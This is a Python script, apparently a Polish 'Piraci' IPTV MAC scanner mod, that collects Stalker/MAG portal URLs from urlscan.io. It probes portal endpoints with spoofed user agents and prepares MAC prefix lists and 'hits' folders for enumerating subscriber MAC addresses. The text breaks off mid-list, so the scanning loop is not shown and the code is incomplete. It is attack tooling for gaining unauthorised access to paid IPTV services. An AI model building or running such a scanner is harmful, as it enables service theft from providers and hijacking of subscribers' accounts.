# -*- coding: utf-8 -*-
# -*- update: [2025.06.27] -*-
# -*- Mod: ᑭIᖇᗩᑕI -*-

wersja = "3.5.1.india"
twoj_nick="🇮🇳 India 🇮🇳"

import os, sys, importlib

def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')

def set_title_name(title: str) -> None:
    if sys.platform.startswith('win'): import ctypes; ctypes.windll.kernel32.SetConsoleTitleW(title)
    else: sys.stdout.flush(); sys.stdout.write(f'''\x1b]2;{title} \x07'''); sys.stdout.flush()

set_title_name(f"Piraci Premium Scaner | v{wersja} | Private")

packages = {
    "urllib3": "urllib3",
    "threading": "threading",
    "urllib": "urllib",
    **({"requests": "requests"} if os.name == 'nt' and sys.version_info >= (3, 6, 8) else {"requests": "requests==2.27.1"}),
    **({"fake_useragent": "fake_useragent"} if os.name == 'nt' and sys.version_info >= (3, 6, 8) else {"fake_useragent": "fake_useragent==1.5.1"}),
    **({"cloudscraper": "cloudscraper"} if os.name == 'nt' and sys.version_info >= (3, 6, 8) else {"cloudscraper": "cloudscraper==1.2.58"}),
}

if os.name == 'nt' and sys.version_info > (3, 6, 7):
    packages["playsound"] = "playsound"

elif os.name != 'nt' and sys.version_info < (3, 6, 7):
    packages["sock"] = ["requests[socks]", "sock", "socks", "PySocks"]
    packages["cfscrape"] = "cfscrape"

for pkg, install_name in packages.items():
    try: globals()[pkg] = importlib.import_module(pkg)
    except ImportError: os.system(f'"{sys.executable}" -m pip install {install_name}'); globals()[pkg] = importlib.import_module(pkg)

import platform, datetime, requests, threading, urllib3

if os.name == 'nt' and sys.version_info > (3, 6, 7):
    try: sesq= requests.Session(); ses = cloudscraper.create_scraper(sess=sesq)
    except:ses= requests.Session()
elif os.name != 'nt' and sys.version_info < (3, 6, 7):
    try:sesq= requests.Session(); ses = cfscrape.create_scraper(sess=sesq)
    except:ses= requests.Session()

import socket,hashlib,pathlib
import json, random, time, re
from datetime import date

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except (ConnectionRefusedError, ImportError):
    class DummyAndroid:
        def __getattr__(self, name):
            def method(*args, **kwargs):
                print(f"\n      \x1b[38;5;102mDummy call to: {name} with args {args} and kwargs {kwargs}")
                return None
            return method
    ad = DummyAndroid() 

clear_screen()

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import logging
logging.captureWarnings(True)

def restart_script(): print(f"\n\n         {GOLD}× {RED}ᴘʀᴏɢʀᴀᴍ ʀᴇsᴛᴀʀᴛᴜʝᴇ {GOLD}×      \n\n"); os.execv(sys.executable, [sys.executable] + sys.argv)

RED, FRED, BLUE, GREEN1, GREEN, CYAN, MAGENTA, GRAY, GOLD, WHITE, YELLOW, FCYAN, FWHITE, FBLACK, FYELLOW, INVERT, RESET = ("\x1b[38;5;9m", "\x1b[1;38;5;9m", "\x1b[38;5;37m", "\x1b[38;5;10m", "\x1b[38;5;2m", "\x1b[38;5;14m", "\x1b[38;5;13m", "\x1b[38;5;102m", "\x1b[38;5;223m", "\x1b[38;5;1m", "\x1b[38;5;11m", "\x1b[1;38;5;14m", "\x1b[1;38;5;1m", "\x1b[1;38;5;0m", "\x1b[1;38;5;11m", "\x1b[1;7m", "\x1b[0m")

MOD = f'🜲ᶫˣ' if os.name == 'nt' else [f'🜲ᶫˣ', f'༺ ᶫˣ ༻   '][datetime.datetime.now().second % 2]

LOGO = f"""
  ⠀⠀⡶⠛⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⠚⢶⡀{MOD}     
 
""" if os.name != "nt" else f"""
  ╔═══╗──────────╔═══╗ {MOD}     
     
"""

base_dir = "/sdcard" if os.name != 'nt' else "."
folder = "ᑭOᒪՏKI.ՏKᑌᖇᗯIᗴᒪ.Տᑕᗩᑎ"
dirs = ["combo", "portal", os.path.join("hits", folder)]
combo_dir, portal_dir, hits = (os.path.join(base_dir, d) for d in dirs)
india_hits_dir, full_hits_dir, mini_hits_dir, combo_hits_dir = (os.path.join(hits, sub) for sub in ["india hits", "full hits", "mini hits", "combo hits"])
list(map(lambda d: os.makedirs(d, exist_ok=True), [india_hits_dir, combo_dir, portal_dir, hits, full_hits_dir, mini_hits_dir, combo_hits_dir]))

ile_mac_combo, cpm, ile_mac = 0, 0, 0

piraci=(f"""{RESET}{GOLD}
{LOGO}


            Pᴏʟsᴋɪ Sᴋᴀɴᴇʀ Iᴘᴛᴠ  

         🏴‍☠️ ℙ𝕀ℝ𝔸ℂ𝕀 ℤ 𝕂𝔸ℝ𝔸𝕀𝔹ó𝕎 🏴‍☠️             
{BLUE}             🏴‍☠️SɪʀQᴀᴢ Cᴏɴғɪɢ🏴‍☠️     {GOLD}

{FWHITE}         ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ           {RESET}{FWHITE}""")

def rwsa(text) -> str:
    normal_alphabet = "AĄÄBCĆDEĘFGHIJKLŁMNOÖÒÓPQRSŚTUÜVWXYZŻŹ" + "aąäbcćdeęfghijklłmnoöòópqrsśtuüvwxyzżź" + "1234567890" # + '+-=()'
    special_alphabet1 = "ᴀᴀᴀʙᴄᴄᴅᴇᴇғɢʜɪᴊᴋʟʟᴍᴎᴏᴏᴏᴏᴘǫʀssᴛᴜᴜᴠᴡxʏᴢzᴢ" + "ᴀᴀᴀʙᴄᴄᴅᴇᴇғɢʜɪᴊᴋʟʟᴍᴎᴏᴏᴏᴏᴘǫʀssᴛᴜᴜᴠᴡxʏᴢzz" + f"{'1234567890' if os.name == 'nt' else '𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶'}" # + '₊ ₋ ₌ ₍ ₎'
    special_alphabet2 = 'ᴬᴬᴬᴮᶜᶜᴰᴱᴱᶠᴳᴴᴵᴶᴷᴸᴸᴹᴺᴼᴼᴼᴼᴾᵠᴿˢˢᵀᵁᵁⱽᵂˣʸᶻᶻᶻ' + 'ᵃᵃᵃᵇᶜᶜᵈᵉᵉᶠᵍʰⁱʲᵏˡˡᵐⁿᵒᵒᵒᵒᵖᵠʳˢˢᵗᵘᵘᵛʷˣʸᶻᶻᶻ' + '¹²³⁴⁵⁶⁷⁸⁹⁰' # + '⁺⁻⁼⁽⁾'
    translation_table = str.maketrans(normal_alphabet, special_alphabet1)
    return text.translate(translation_table)

def extract_host_port(url):
    match = re.match(r"https?://([^/:]+)(?::(\d+))?", url)  
    if not match: match = re.match(r"([^/:]+)(?::(\d+))?", url)
    if match:
        hostname = match.group(1)
        port = match.group(2) if match.group(2) else "80"
        return f"{hostname}:{port}"
    return None

def replace_symbols(text):
    replacements = {
        "{": "", "|": "", "[": "", "]": "", "«»": "",
        "🏴‍☠️AE": " |🇦🇪 AE", "🏴‍☠️UAE": " |🇦🇪 UAE", "🏴‍☠️ALL": " |🏁ALL ",
        "🏴‍☠️ASIA INDIA": " |🇮🇳 ASIA INDIA", "🏴‍☠️ASIA PUNJABI": " |🇮🇳 ASIA PUNJABI",
        "🏴‍☠️ASIA MALAYALAM": " |🇮🇳 ASIA MALAYALAM", "🏴‍☠️ASIA MARATHI": " |🇮🇳 ASIA MARATHI",
        "🏴‍☠️ASIA KANNADA": " |🇮🇳 ASIA KANNADA", "🏴‍☠️ASIA TAMIL": " |🇮🇳 ASIA TAMIL",
        "🏴‍☠️ASIA GUJARATI": " |🇮🇳 ASIA GUJARATI", "🏴‍☠️ASIA TELUGU": " |🇮🇳 ASIA TELUGU",
        "🏴‍☠️ASIA BHOJPURI": " |🇮🇳 ASIA BHOJPURI", "🏴‍☠️ASIA URDU": " |🇮🇳 ASIA URDU",
        "🏴‍☠️ASIA BENGALI": " |🇮🇳 ASIA BENGALI", "🏴‍☠️ASIA SINHALA": " |🇮🇳 ASIA SINHALA",
        "🏴‍☠️ASIA  INDIA": " |🇮🇳 ASIA INDIA", "🏴‍☠️ASIA  PUNJABI": " |🇮🇳 ASIA PUNJABI",
        "🏴‍☠️ASIA  MALAYALAM": " |🇮🇳 ASIA MALAYALAM", "🏴‍☠️ASIA  MARATHI": " |🇮🇳 ASIA MARATHI",
        "🏴‍☠️ASIA  KANNADA": " |🇮🇳 ASIA KANNADA", "🏴‍☠️ASIA  TAMIL": " |🇮🇳 ASIA TAMIL",
        "🏴‍☠️ASIA  GUJARATI": " |🇮🇳 ASIA GUJARATI", "🏴‍☠️ASIA  TELUGU": " |🇮🇳 ASIA TELUGU",
        "🏴‍☠️ASIA  BHOJPURI": " |🇮🇳 ASIA BHOJPURI", "🏴‍☠️ASIA  URDU": " |🇮🇳 ASIA URDU",
        "🏴‍☠️ASIA  BENGALI": " |🇮🇳 ASIA BENGALI", "🏴‍☠️ASIA  SINHALA": " |🇮🇳 ASIA SINHALA",
        "🏴‍☠️ALB": " |🇦🇱 ALB", "🏴‍☠️AL": " |🇦🇱 AL", "🏴‍☠️AR": " |🇸🇦 AR",
        "🏴‍☠️AT": " |🇦🇹 AT", "🏴‍☠️AU": " |🇦🇺 AU", "🏴‍☠️AZ": " |🇦🇿 AZ",
        "🏴‍☠️BE": " |🇧🇪 BE", "🏴‍☠️BG": " |🇧🇬 BG", "🏴‍☠️BIH": " |🇧🇦 BIH",
        "🏴‍☠️BO": " |🇧🇴 BO", "🏴‍☠️BR": " |🇧🇷 BR", "🏴‍☠️CA": " |🇨🇦 CA",
        "🏴‍☠️CH": " |🇨🇭 CH", "🏴‍☠️SW": " |🇨🇭 SW", "🏴‍☠️CL": " |🇨🇱 CL",
        "🏴‍☠️CN": " |🇨🇳 CN", "🏴‍☠️CO": " |🇨🇴 CO", "🏴‍☠️CR": " |🇭🇷 CR",
        "🏴‍☠️CZ": " |🇨🇿 CZ", "🏴‍☠️DENMARK": " |🇩🇰 DENMARK", "🏴‍☠️DE": " |🇩🇪 DE",
        "🏴‍☠️DK": " |🇩🇰 DK", "🏴‍☠️DM": " |🇩🇰 DM", "🏴‍☠️EC": " |🇪🇨 EC",
        "🏴‍☠️EG": " |🇪🇬 EG", "🏴‍☠️EN": " |🇬🇧 EN", "🏴‍☠️GB": " |🇬🇧 GB",
        "🏴‍☠️EU": " |🇪🇺 EU", "🏴‍☠️ES": " |🇪🇸 ES", "🏴‍☠️VIP": " |⚽️ VIP",
        "🏴‍☠️SP": " |🇪🇸 SP", "🏴‍☠️EX": " |🇭🇷 EX", "🏴‍☠️YU": " |🇭🇷 YU",
        "??‍☠️FI": " |🇫🇮 FI", "🏴‍☠️FR": " |🇫🇷 FR", "🏴‍☠️GOR": " |🇲🇪 GOR",
        "🏴‍☠️GR": " |🇬🇷 GR", "🏴‍☠️HR": " |🇭🇷 HR", "🏴‍☠️HU": " |🇭🇺 HU",
        "🏴‍☠️IE": " |🇮🇪 IE", "🏴‍☠️IL": " |🇮🇪 IL", "🏴‍☠️IR": " |🇮🇪 IR", "🏴‍☠️IND ": " |🇮🇩 IND ", 
        "🏴‍☠️ID": " |🇮🇩 ID", "🏴‍☠️IN": " |🇮🇳 IN", "🏴‍☠️IT": " |🇮🇹 IT",
        "🏴‍☠️INDIA": " |🇮🇳 INDIA", "🏴‍☠️PUNJABI": " |🇮🇳 PUNJABI", "🏴‍☠️MALAYALAM": " |🇮🇳 MALAYALAM",
        "🏴‍☠️MARATHI": " |🇮🇳 MARATHI", "🏴‍☠️KANNADA": " |🇮🇳 KANNADA", "🏴‍☠️TAMIL": " |🇮🇳 TAMIL",
        "🏴‍☠️GUJARATI": " |🇮🇳 GUJARATI", "🏴‍☠️TELUGU": " |🇮🇳 TELUGU", "🏴‍☠️BHOJPURI": " |🇮🇳 BHOJPURI",
        "🏴‍☠️URDU": " |🇮🇳 URDU", "🏴‍☠️BENGALI": " |🇮🇳 BENGALI", "🏴‍☠️SINHALA": " |🇮🇳 SINHALA",
        "🏴‍☠️JP": " |🇯🇵 JP", "🏴‍☠️KE": " |🇰🇪 KE", "🏴‍☠️KU": " |🇭🇺 KU",
        "🏴‍☠️KR": " |🇰🇷 KR", "🏴‍☠️LU": " |🇱🇺 LU", "🏴‍☠️MKD": " |🇲🇰 MKD",
        "🏴‍☠️MX": " |🇲🇽 MX", "🏴‍☠️MY": " |🇲🇾 MY", "🏴‍☠️NETFLIX": " |🚩 NETFLIX",
        "🏴‍☠️NG": " |🇳🇬 NG", "🏴‍☠️NZ": " |🇳🇿 NZ", "🏴‍☠️NL": " |🇳🇱 NL",
        "🏴‍☠️NO": " |🇳🇴 NO", "🏴‍☠️PA": " |🇵🇦 PA", "🏴‍☠️PE": " |🇵🇪 PE",
        "🏴‍☠️PH": " |🇵🇭 PH", "🏴‍☠️PK": " |🇵🇰 PK", "🏴‍☠️PL": " |🇵🇱 PL - POLSKA",
        "🏴‍☠️POLSKA": " |🇵🇱 PL - POLSKA", "🏴‍☠️POLAND": " |🇵🇱 PL - POLSKA",
        "🏴‍☠️PT": " |🇵🇹 PT", "🏴‍☠️PPV": " |🏋🏼‍♂️ PPV", "🏴‍☠️QA": " |🇶🇦 QA",
        "🏴‍☠️RO": " |🇷🇴 RO", "🏴‍☠️RU": " |🇷🇺 RU", "🏴‍☠️SA": " |🇸🇦 SA",
        "🏴‍☠️SCREENSAVER": " |🏞 SCREENSAVER", "🏴‍☠️SE": " |🇸🇪 SE",
        "🏴‍☠️SK": " |🇸🇰 SK", "🏴‍☠️SL": " |🇸🇮 SL", "🏴‍☠️SG": " |🇸🇬 SG",
        "🏴‍☠️SR": " |🇷🇸 SR", "🏴‍☠️SU": " |🇦🇲 SU", "🏴‍☠️TH": " |🇹🇭 TH",
        "🏴‍☠️TR": " |🇹🇷 TR", "🏴‍☠️TW": " |🇹🇼 TW", "🏴‍☠️UKR": " |🇺🇦 UKR",
        "🏴‍☠️US": " |🇺🇸 US", "🏴‍☠️UK": " |🇬🇧 UK", "🏴‍☠️VN": " |🇻🇳 VN", "🏴‍☠️VP VIAPLAY": " |📺 VP VIAPLAY", 
        "🏴‍☠️WEB": " |🏳️‍🌈 WEB", "🏴‍☠️ZA": " |🇿🇦 ZA", "🏴‍☠️AF": " |🇿🇦 AF", "🏴‍☠️FORMU": " |🏎️ FORMU", 
        "🏴‍☠️ADU": " |🔞 ADULTS", "🏴‍☠️FO": " |🔞 FO", "🏴‍☠️⋅ FOR": " |🔞 ⋅ FOR", "🏴‍☠️18": " |🔞 18",
        "🏴‍☠️BLU": " |🔞 BLU", "🏴‍☠️XXX": " |🔞 XXX", "🏴‍☠️4K" : " |🏝️️ 4K", "🏴‍☠️": "   |🏴‍☠️ "
    }
    for old, new in replacements.items(): text = text.replace(old, new)
    return text

def replace_status(status_code: int):
    status_codes = {
        200: f"{GREEN1}ᴀᴠᴀɪʟᴀʙʟᴇ [ 200 ]{RESET}",
        401: f"{MAGENTA}ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ [ 401 ]{RESET}",
        403: f"{RED}Fᴏʀʙɪᴅᴅᴇɴ [ 403 ]{RESET}",
        512: f"{GREEN}Gᴏᴏᴅ [ 512 ]{RESET}",
        503: f"{MAGENTA}Sᴇʀᴠɪᴄᴇ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ [ 503 ]{RESET}",
        520: f"{MAGENTA}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ 520 ]{RESET}",
        404: f"{GREEN}Gᴏᴏᴅ [ 404 ]{RESET}",
        301: f"{BLUE}ʀᴇᴅɪʀᴇᴄᴛ [ 301 ]{RESET}",
        500: f"{BLUE}Sᴇʀᴠᴇʀ Eʀʀᴏʀ [ 500 ]{RESET}",
        429: f"{BLUE}ᴛᴏᴏ ᴍᴀɴʏ ʀᴇqᴜᴇsᴛs [ 429 ]{RESET}",
        302: f"{BLUE}ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ [ 302 ]{RESET}",
    }
    return status_codes.get(status_code, f"{GREEN1}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ {status_code} ]{RESET}")

def fetch_and_save_urlscan_io():
    clear_screen()
    print(f"""{GRAY}

  █░█ █▀▄ █░ █▀ █▀ ▄▀█ █▄░█ ░ █ █▀█     
  █▄█ █▀▄ █▄ ▄█ █▄ █▀█ █░▀█ ▄ █ █▄█      
       portal scrapper by ༺ ᶫˣ ༻    
""")
    choice=input(f"\n\n{GOLD}         Kliknij enter aby pobrać  {RESET}") or ""
    if choice != "": return
    try:
        result_urls = []
        output_path = "new_200_portals.txt"
        folder_path = combo_dir
        output_file_path = folder_path+output_path
        base_url = "https://urlscan.io/api/v1/search/?q=filename%3A%22portal.php%3Ftype%3Dstb%26action%3Dhandshake%26token%3D%26prehash%3D0%26JsHttpRequest%3D1-xml%22"
        paginated_url = f"{base_url}"
        response = requests.get(paginated_url, timeout=3)
        response.raise_for_status()
        data = response.json()
        result_urls = [entry['page']['url'] for entry in data.get('results', []) if 'page' in entry and entry['page'].get('status') == "200"]
        with open(output_file_path, "w", encoding="utf-8") as file: file.write("\n".join([url.replace("https", "http") for url in result_urls]))
        with open(output_file_path, 'r', encoding='utf-8') as file: lines = file.readlines()
        result_urls = sorted(set(lines), key=lines.index)
        with open(output_file_path, 'w', encoding='utf-8') as file: file.writelines(result_urls)
        line_count = len(result_urls)
        sup_digits = '⁰¹²³⁴⁵⁶⁷⁸⁹'
        count_str = ''.join(sup_digits[int(d)] for d in str(line_count))
        new_output_file = os.path.join(folder_path, f"PORTAL_MAC-ᑭOᒪՏKI.ՏKᑌᖇᗯIᗴᒪ.Տᑕᗩᑎ✓ᵘʳᶫˢᶜᵃᶰ·ᶦᵒ·{count_str}_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
        os.rename(output_file_path, new_output_file)
        print(f'\n{GOLD}Plik pobrany z nowymi {len(result_urls)} portalami i zapisane: {new_output_file}')
        time.sleep(4)
    except requests.exceptions.RequestException as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ HTTP-Error: {e} ⍟    \n\n")
    except Exception as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ {e} ⍟    \n\n")
    clear_screen()

def fetch_and_choose_url():
    try:
        base_url = "https://urlscan.io/api/v1/search/?q=filename%3A%22portal.php%3Ftype%3Dstb%26action%3Dhandshake%26token%3D%26prehash%3D0%26JsHttpRequest%3D1-xml%22"
        response = requests.get(base_url, timeout=3)
        response.raise_for_status()
        data = response.json()
        result_urls = [entry['page']['url'] for entry in data.get('results', []) if 'page' in entry and entry['page'].get('status') == "200"]
        if not result_urls:
            print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ No URL Found ⍟    \n\n")
            portal_input=2
            return None
        return result_urls
    except requests.exceptions.RequestException as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ HTTP-Error: {e} ⍟    \n\n"); portal_input=2
    except Exception as e:print(f"\n\n{RED}      ╭─◉🄴🅁🅁🄾🅁─○○     \n      ╰◉ ⍟ {e} ⍟    \n\n"); portal_input=2
    return None

def paneltotList(input_value):
    if isinstance(input_value, list): return input_value
    elif isinstance(input_value, str): return input_value.split("\n") if "\n" in input_value else [input_value]
    else: restart_script()

def list_files(directory):
    return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

def get_user_choice(files):
    print(f"\n{GREEN} ⟬ {GRAY}Combo MAC listy{GREEN} ⟭ {BLUE}")
    print("Wybierz plik z adresem panelu do skanowania")
    print("Pliki tekstowe z adresami paneli muszą znajdować się w katalogu COMBO\n") 
    for i, file in enumerate(files): print(f"{GRAY} ⍟ {GOLD}{i + 1}{GRAY}: {GREEN}{file}{GRAY} ⍟")
    print(f"\n{GREEN} ≼ ⟬ {GRAY}Ilość plików w katalogu COMBO = {GOLD}{len(files)}{GREEN} ⟭ ≽ {BLUE}") 
    while True:
        try:
            choice = int(input(f"\nPlik numer = {RESET}")) - 1
            if 0 <= choice < len(files): return files[choice]
            else: print("{RED} Nieprawidłowy wybór. Spróbuj ponownie. {RESET}")
        except ValueError: print("{RED} Wpisz poprawny numer. {RESET}")

def read_first_line(file_path):
    with open(file_path, "r", encoding="utf-8") as f: return f.readline().strip()

def lese_datei_in_liste(dateipfad):
    global macuz
    with open(dateipfad, "r", encoding="utf-8") as file: macliste = file.read().splitlines()
    macuz = len(macliste)
    return macliste

def zufaellige_zeile_entnehmen(zeilen_liste):
    global combomacyesno, mactur
    if zeilen_liste: return zeilen_liste.pop(random.randrange(len(zeilen_liste)))
    mactur = "00:1A:79"
    combomacyesno="1"
    return "00:1A:79:00:06:66"

def search_panel(url):
    status_map = {
        200: f"{GREEN1}ᴀᴠᴀɪʟᴀʙʟᴇ [ 200 ]{RESET}",
        401: f"{MAGENTA}ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ [ 401 ]{RESET}",
        403: f"{RED}Fᴏʀʙɪᴅᴅᴇɴ [ 403 ]{RESET}",
        512: f"{GREEN}Gᴏᴏᴅ [ 512 ]{RESET}",
        503: f"{MAGENTA}Sᴇʀᴠɪᴄᴇ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ [ 503 ]{RESET}",
        520: f"{MAGENTA}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ 520 ]{RESET}",
        404: f"{RED}Nᴏᴛ Ғᴏᴜɴᴅ [ 404 ]{RESET}",
        301: f"{BLUE}ʀᴇᴅɪʀᴇᴄᴛ [ 301 ]{RESET}",
        500: f"{BLUE}Sᴇʀᴠᴇʀ Eʀʀᴏʀ [ 500 ]{RESET}",
        429: f"{BLUE}ᴛᴏᴏ ᴍᴀɴʏ ʀᴇqᴜᴇsᴛs [ 429 ]{RESET}",
        302: f"{BLUE}ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ [ 302 ]{RESET}",
    }
    endpoints = [
        '/portal.php', '/portal.php - Real Blue', '/portal.php - httpS',
        '/c/portal.php', '/c/server/load.php', '/portalott.php',
        '/stalker_u.php', '/stalker_portal/server/load.php',
        '/stalker_portal/server/load.php - old', '/stalker_portal/server/load.php - «▣»',
        '/stalker_portal/server/load.php - httpS', '/BoSSxxxx/portal.php',
        '/magaccess/portal.php',
    ]
    scan_results = []
    best_result = {"status": "", "url": ""}
    for endpoint in endpoints:
        try:
            res = requests.get(url + endpoint, headers={'User-Agent': fake_useragent.UserAgent().random}, timeout=5)
            code = res.status_code
            status_text = status_map.get(code, f"{RED}Unknown [{code}]{RESET}")
            scan_results.append(f"{status_text} {BLUE}{endpoint}{RESET}")
            if code in (200, 401, 512):
                if (best_result["status"] != status_text) or (len(endpoint) < len(best_result["url"])): best_result = {"status": status_text, "url": endpoint}
        except (requests.ConnectionError, requests.Timeout): scan_results.append(f"{RED}No connection{GRAY} for {BLUE}{endpoint}{RESET}")
    return scan_results, best_result

def get_external_ip(): 
    try: return json.load(urllib.request.urlopen("http://httpbin.org/ip"))["origin"]
    except: return "Uɴᴋɴᴏᴡɴ"

def get_country_from_ip_online(ip_address, timeout: int = 3):
    try: return tuple(requests.get(f'http://ipinfo.io/{ip_address}/json', timeout=timeout, allow_redirects=False).json().get(k, 'Uɴᴋɴᴏᴡɴ') for k in ('region', 'city', 'country'))
    except: return ('Uɴᴋɴᴏᴡɴ', 'Uɴᴋɴᴏᴡɴ', 'Uɴᴋɴᴏᴡɴ')

def country_to_flag(country_code):
    if not country_code or len(country_code) != 2: country_code = "PL"
    country_code = country_code.upper()
    return chr(0x1F1E6 + ord(country_code[0]) - ord('A')) + \
           chr(0x1F1E6 + ord(country_code[1]) - ord('A'))

def set_country(code: str) -> str:
    c = code.upper().strip()
    return rwsa("🏴‍☠️ Pirat") if c == "Uɴᴋɴᴏᴡɴ" or c not in country_names else country_to_flag(c) + f" {rwsa(f'{(country_names[c])}')} {rwsa(f'[{c}]')}"

country_names = {'US': 'Stany Zjednoczone', 'NO': 'Norwegia', 'SE': 'Szwecja', 'HU': 'Węgry', 'FI': 'Finlandia', 'FR': 'Francja', 'DE': 'Niemcy', 'BG': 'Bułgaria', 'UA': 'Ukraina', 'BR': 'Brazylia', 'PL': 'Polska', 'AF': 'Afganistan', 'AL': 'Albania', 'DZ': 'Algieria', 'AO': 'Angola', 'AR': 'Argentyna', 'AM': 'Armenia', 'AU': 'Australia', 'AT': 'Austria', 'AZ': 'Azerbejdżan', 'BS': 'Bahamy', 'BH': 'Bahrajn', 'BD': 'Bangladesz', 'BB': 'Barbados', 'BY': 'Białoruś', 'BE': 'Belgia', 'BZ': 'Belize', 'BJ': 'Benin', 'BT': 'Bhutan', 'BO': 'Boliwia', 'BA': 'Bośnia i Hercegowina', 'BW': 'Botswana', 'CA': 'Kanada', 'CV': 'Wyspy Zielonego Przylądka', 'KH': 'Kambodża', 'CL': 'Chile', 'CM': 'Kamerun', 'CN': 'Chiny', 'CO': 'Kolumbia', 'CG': 'Kongo-Brazzaville', 'CD': 'Kongo-Kinszasa', 'CR': 'Kostaryka', 'HR': 'Chorwacja', 'CU': 'Kuba', 'CY': 'Cypr', 'CZ': 'Czechy', 'DK': 'Dania', 'DJ': 'Dżibuti', 'DO': 'Dominikana', 'EC': 'Ekwador', 'EG': 'Egipt', 'SV': 'Salwador', 'EE': 'Estonia', 'ET': 'Etiopia', 'GH': 'Ghana', 'GE': 'Gruzja', 'GR': 'Grecja', 'HK': 'Hongkong', 'IS': 'Islandia', 'IN': 'Indie', 'ID': 'Indonezja', 'IR': 'Iran', 'IE': 'Irlandia', 'IL': 'Izrael', 'IT': 'Włochy', 'JP': 'Japonia', 'JO': 'Jordania', 'KZ': 'Kazachstan', 'KE': 'Kenia', 'KR': 'Korea', 'LA': 'Laos', 'LV': 'Łotwa', 'LB': 'Liban', 'LT': 'Litwa', 'LU': 'Luksemburg', 'MY': 'Malezja', 'MV': 'Malediwy', 'MT': 'Malta', 'MX': 'Meksyk', 'MD': 'Mołdawia', 'MC': 'Monako', 'MN': 'Mongolia', 'MA': 'Maroko', 'NP': 'Nepal', 'NL': 'Holandia', 'NZ': 'Nowa Zelandia', 'NI': 'Nikaragua', 'NG': 'Nigeria', 'MK': 'Macedonia Północna', 'PK': 'Pakistan', 'PA': 'Panama', 'PY': 'Paragwaj', 'PE': 'Peru', 'PH': 'Filipiny', 'PT': 'Portugalia', 'RO': 'Rumunia', 'RU': 'Rosja', 'SA': 'Arabia Saudyjska', 'SN': 'Senegal', 'RS': 'Serbia', 'SG': 'Singapur', 'SK': 'Słowacja', 'SI': 'Słowenia', 'ZA': 'Republika Południowej Afryki', 'ES': 'Hiszpania', 'LK': 'Sri Lanka', 'SD': 'Sudan', 'SR': 'Surinam', 'CH': 'Szwajcaria', 'SY': 'Syria', 'TW': 'Tajwan', 'TJ': 'Tadżykistan', 'TZ': 'Tanzania', 'TH': 'Tajlandia', 'TG': 'Togo', 'TT': 'Trynidad i Tobago', 'TN': 'Tunezja', 'TR': 'Turcja', 'TM': 'Turkmenistan', 'UG': 'Uganda', 'AE': 'Zjednoczone Emiraty Arabskie', 'GB': 'Wielka Brytania', 'UY': 'Urugwaj', 'UZ': 'Uzbekistan', 'VE': 'Wenezuela', 'VN': 'Wietnam', 'YE': 'Jemen', 'ZM': 'Zambia', 'ZW': 'Zimbabwe'}

ip_address = get_external_ip()
region, city, country = get_country_from_ip_online(ip_address)
country = set_country(country)
nick='broccoloid'
print(piraci) 
twoj_nick=input(f"""{BLUE}

{GREEN} ≼ ⟬ {GOLD}{country} {GREEN}⟭ ≽  {BLUE}

Wpisz swoją nazwę 
Nazwa będzie widoczna w pliku z hitami
 
{GREEN} ≼ ⟬ {GRAY} Przykład  = {GOLD}{twoj_nick}{GREEN} ⟭ ≽  {BLUE}      

Nazwa = {RESET}""") or twoj_nick

totLen, dosyaa, jakie_kategorie = "000000", "", "0"
yeninesil = ("D4:CF:F9", "33:44:CF", "10:27:BE", "A0:BB:3E", "55:93:EA", "04:D6:AA", "11:33:01", "00:1C:19", "1A:00:6A",
             "1A:00:FB", "00:1B:79", "78:A3:52", "CC:97:AB", "AC:AE:19", "E4:7D:BD", "FC:03:9F", "B8:BC:5B", "00:2A:79",
